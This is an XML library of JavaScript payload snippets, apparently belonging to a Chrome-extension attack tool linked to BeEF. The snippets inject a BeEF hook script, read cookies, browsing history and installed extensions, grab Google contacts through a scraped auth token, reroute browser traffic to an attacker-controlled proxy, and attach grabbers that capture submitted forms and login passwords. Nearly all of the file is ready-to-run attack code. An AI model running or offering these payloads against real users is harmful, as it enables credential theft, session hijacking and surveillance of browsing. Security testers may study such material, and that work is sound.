<?xml version="1.0" encoding="utf-8"?>
<snippets>
<snippet type="eval-snippets" name="xhr">
x = new XMLHttpRequest();
x.onreadystatechange = function() {
if (x.readyState == 4) {
   __logEval(x.responseText);
}
};
x.open('GET','/',true);
x.send(null);
</snippet>
<snippet type="eval-snippets" name="alert">alert(/xss/);</snippet>
<snippet type="eval-snippets" name="location">location;</snippet>
<snippet type="eval-snippets" name="list scripts">
var s = [];
for (i=0;i&lt;document.scripts.length;i++) {
s.push(document.scripts[i].src || document.scripts[i].textContent);
}
s;
</snippet>
<snippet type="eval-snippets" name="add script">
(function() {
var d=document;
var s = d.createElement('script');
s.src = 'script.js';
d.body.appendChild(s);
})();
</snippet>
<snippet type="eval-snippets" name="BeEF init">
(function() {
var d=document;
var s = d.createElement('script');
s.src = 'http://127.0.0.1:3000/hook.js'; // BeEF hook here
s.setAttribute('onload','beef_init();');
d.body.appendChild(s);
})();
</snippet>
<snippet type="eval-ext-snippets" name="get cookies">
//extension needs cookies permission
chrome.cookies.getAll({
  // comment out following line to get cookies for all domains
  url:"https://www.google.com/"
}, __logEval);
</snippet>
<snippet type="eval-ext-snippets" name="set cookie">
//extension needs cookies permission
chrome.cookies.set({
  url: 'https://www.google.com/',
  name: 'test-chef',
  value: 'test-ok',
  secure: true,
  httpOnly: true,
  expirationDate: 1417390624, // unix timestamp or null for session cookie
  path: '/'
}, __logEval);
</snippet>
<snippet type="eval-ext-snippets" name="remove cookie">
//extension needs cookies permission
chrome.cookies.remove({
  url: 'https://www.google.com/',
  name: 'test-chef'
}, __logEval)
</snippet>
<snippet type="eval-ext-snippets" name="have you visited google?">
// requires history permission
chrome.history.getVisits({
  url: 'http://www.google.com/'
}, __logEval);
</snippet>
<snippet type="eval-ext-snippets" name="search history">
// requires history permission
chrome.history.search({
  text: 'google'
}, __logEval)
</snippet>
<snippet type="eval-ext-snippets" name="delete URL from history">
// requires history permission
chrome.history.deleteUrl({
  url: 'http://www.example.com/'
})
</snippet>
<snippet type="eval-ext-snippets" name="do I have file:// access?">
chrome.extension.isAllowedFileSchemeAccess(__logEval);
</snippet>
<snippet type="eval-ext-snippets" name="get manifest">
x = new XMLHttpRequest();
x.onreadystatechange = function() {
   var d;
  try {
    d=JSON.parse(x.responseText);
 } catch (e) {d=x.responseText}
if (x.readyState == 4) {
   __logEval(d);
}
};
x.open('GET','/manifest.json',true);
x.send(null);
</snippet>
<snippet type="eval-ext-snippets" name="grab Google contacts">
// copied from BeEF             
// authors: ["Kos", "antisnatchor"]
// https://github.com/beefproject/beef/tree/master/modules/chrome_extensions/grab_google_contacts
(function() {
        var regContacts = '("AuthToken":{"Value":")(.*)("}}};)';
        function grabCSV(token){
            var csv = new XMLHttpRequest();
            csv.open("GET", "https://www.google.com/voice/c/b/X/data/export?groupToExport=%5EMine&amp;exportType=ALL&amp;out=GMAIL_CSV&amp;tok="+token,false);
            csv.setRequestHeader("Content-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.3");
            csv.send();
            return csv.responseText
        }

        function toolContact(v) {
            var re = new RegExp(regContacts);
            var m = re.exec(v);
            if (m != null) {
                tmpCSV = grabCSV(m[2])
                params = "email=email&amp;csv="+tmpCSV;
                setTimeout(function(){__logEval(tmpCSV);},100);
             }
        }

        function grabContacts(){
            var client = new XMLHttpRequest();
            client.open("GET", "https://www.google.com/voice/c/b/X/ui/ContactManager" ,false);
            client.setRequestHeader("Content-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.3");
            client.send();
            if(client.status != 200){ // if the victim is not authenticated in Google, a 403 Forbidden error is received.
                setTimeout(function() {__logEval('not logged in');},100);
            }else{ //proceed
                toolContact(client.responseText);
            }
        }

        grabContacts();
})();
</snippet>
<snippet type="eval-ext-snippets" name="get installed apps">
// requires management permission, by @theKos
try {
  chrome.management.getAll(__logEval)
} catch (e){
  __logEval(e);
}
</snippet>
<snippet type="eval-ext-snippets" name="extension has plugins?">
// by @theKos
x = new XMLHttpRequest();
x.onreadystatechange = function() {
   var d;
  try {
    d=JSON.parse(x.responseText);
 } catch (e) {d=x.responseText}
if (x.readyState == 4) {
   if (d['plugins']){
      __logEval(d['plugins']);
   } else {
      __logEval(false);
   }
}
};
x.open('GET','/manifest.json',true);
x.send(null);
</snippet>
<snippet type="eval-ext-snippets" name="get proxy settings">
// by @theKos, requires proxy permission
try {
   chrome.proxy.settings.get({'incognito': false},__logEval);
} catch (e){
   log({type:'recveval', result:false});
}
</snippet>
<snippet type="eval-ext-snippets" name="set proxy settings">
// by @theKos, requires proxy permission
// WARNING, COULD POTENTIALLY BREAK BACK CHANNEL
var evilProxy = {
    "mode": "fixed_servers",
    "rules": {
        "bypassList": ["&lt;local&gt;","ATTACKER_DOMAIN.COM"], // EXCLUDE BACK CHANNEL FROM PROXY
        "singleProxy": {
            "host": "localhost", // ATTACKER PROXY IP
            "port": 8080, // ATTACKER PROXY PORT
            "scheme": "http" // ATTACKER PROXY SCHEME
        }
    }
}

try {
   chrome.proxy.settings.set({value: evilProxy, scope: 'regular'},function() {__logEval('Proxy settings updated!');});
} catch (e){
   __logEval('error '+e);
}
</snippet>
<snippet type="eval-ext-snippets" name="reset proxy settings">
// requires proxy permission
try {
   chrome.proxy.settings.get({'incognito': false},__logEval);
} catch (e){
   __logEval(false);
}
</snippet>
<snippet type="persistent-snippets" name="report location">
__logScript('report loc',location.href);
</snippet>
<snippet type="persistent-snippets" name="form grabber">
// this will log ALL forms with ALL fields. feel free to improve this introducing white/blacklists
setTimeout(function() {
    var f = document.forms;
    for (var i=0;i&lt;f.length;i++) {
        f[i].addEventListener('submit',function() {
            var form = {};
            var el = [];
            for (var i = 0; i&lt;this.elements.length;i++) {
                var e = this.elements[i];
                if (e.disabled || !e.name) {
                    continue;
                }
                try {
                    el.push({name: e.name, value: (e.options ? e.options[e.selectedIndex].value : e.value)});
                } catch (e) {}
            }
            for (var i = 0; i&lt;this.attributes.length;i++) {
                form[this.attributes[i].name] = this.attributes[i].value;
            }
            form.elements = el;
            __logScript('form',form);
        }, false);
    }
}, 300);
</snippet>
<snippet type="persistent-snippets" name="login form grabber">
// this will try to only log forms with password fields in them
setTimeout(function() {
    var f = document.forms;
    for (var i=0;i&lt;f.length;i++) {
        f[i].addEventListener('submit',function() {
            var form = {};
            var el = [];
            var passwd_found = false;
            for (var i = 0; i&lt;this.elements.length;i++) {
                var e = this.elements[i];
                if (e.disabled || !e.name) {
                    continue;
                }
                if (e.type &amp;&amp; e.type.toUpperCase() == 'PASSWORD') {
                    passwd_found = true;
                }
                try {
                    el.push({name: e.name, value: (e.options ? e.options[e.selectedIndex].value : e.value)});
                } catch (e) {}
            }
            if (!passwd_found) { // skip form
                return;
            }
            for (var i = 0; i&lt;this.attributes.length;i++) {
                form[this.attributes[i].name] = this.attributes[i].value;
            }
            form.elements = el;
            __logScript('login form',form);
        }, false);
    }
}, 300);
</snippet>
</snippets>